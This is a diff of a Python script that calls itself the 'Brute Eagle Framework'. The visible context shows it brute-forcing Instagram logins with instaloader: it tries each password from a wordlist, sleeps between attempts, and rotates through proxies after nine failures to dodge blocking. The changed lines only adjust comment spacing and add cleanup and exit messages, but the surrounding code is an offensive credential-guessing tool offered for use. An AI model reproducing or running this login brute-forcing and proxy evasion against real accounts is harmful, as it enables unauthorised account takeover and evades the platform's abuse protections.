@@ -85,7 +85,7 @@ for line in Lines:
         pstest = ("{}".format(line.strip()))
         PASSWORD = pstest
         choiceCode = random.choice(codeList)
-        time.sleep(5)  # add a delay of 5 seconds before each login attempt)
+        time.sleep(5) # add a delay of 5 seconds before each login attempt)
         print("\n\033[94mTrying "+pstest+"..."+bcolors.PURPLE)
         if use_proxy:
             # use proxy if flag is set
@@ -102,8 +102,8 @@ for line in Lines:
         if failed_attempts >= 9:
             # switch to using a different proxy after 9 failed attempts
             use_proxy = True
-            failed_attempts = 0  # reset counter after switching to new proxy
-            proxy_index = (proxy_index + 1) % len(proxy_list)  # cycle through proxies in the list
+            failed_attempts = 0 # reset counter after switching to new proxy
+            proxy_index = (proxy_index + 1) % len(proxy_list) # cycle through proxies in the list
             print(bcolors.WARNING +
                   "\n[!] Switching to new proxy server: " + proxy_list[proxy_index])
     except instaloader.exceptions.ConnectionException:
@@ -113,3 +113,8 @@ for line in Lines:
     except instaloader.exceptions.InvalidArgumentException:
         print(bcolors.FAIL+"\n\033[91m[☹] Username not found")
 
+file1.close()
+L.close()
+print("\n\n\033[94m[✔]Brute Complete..!!")
+print("[+] Thank you for using Brute Eagle Framework...Good Bye!!\n")
+exit()
